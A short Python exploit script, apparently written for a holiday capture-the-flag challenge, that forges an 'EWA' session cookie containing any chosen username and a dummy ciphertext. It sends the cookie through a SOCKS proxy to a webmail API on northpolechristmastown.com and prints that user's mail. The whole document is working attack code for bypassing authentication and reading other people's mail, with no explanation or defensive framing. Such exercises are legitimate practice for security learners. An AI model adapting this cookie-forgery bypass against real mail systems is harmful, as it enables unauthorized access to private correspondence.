#!/usr/bin/env python3
import requests
import sys
import json

PROXY = "socks5h://localhost:32080"

class EWA:
    def __init__(self, host='http://mail.northpolechristmastown.com'):
        self.host = host
        ses = requests.session()
        ses.proxies = {
            "http": PROXY,
        }
        self.ses = ses

    def getmail(self, username):
        if '@' not in username:
            username = "{}@northpolechristmastown.com".format(username)
        cookies = {'EWA': json.dumps({
            'name': username,
            'plaintext': '',
            'ciphertext': 'aaaaaaaaaaaaaaaaaaaaaa',
        })}
        resp = self.ses.post(self.host + "/api.js",
            data={"getmail": "getmail"},
            cookies=cookies,
        )
        resp.raise_for_status()
        return resp.json()

if __name__ == "__main__":
    username = sys.argv[1]
    m = EWA()
    mail = m.getmail(username)
    print(mail)
